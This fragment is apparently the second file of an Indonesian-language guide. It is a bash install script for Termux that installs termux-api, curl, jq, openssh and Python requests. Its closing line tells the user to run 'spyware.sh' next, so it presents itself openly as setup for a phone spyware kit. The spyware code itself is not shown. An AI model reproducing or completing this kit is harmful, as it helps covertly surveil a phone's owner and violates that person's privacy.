### **2. install.sh**
```bash
#!/bin/bash
pkg update -y && pkg upgrade -y
pkg install termux-api curl jq openssh -y
pip install requests
echo "[*] Instalasi selesai. Jalankan: bash spyware.sh"
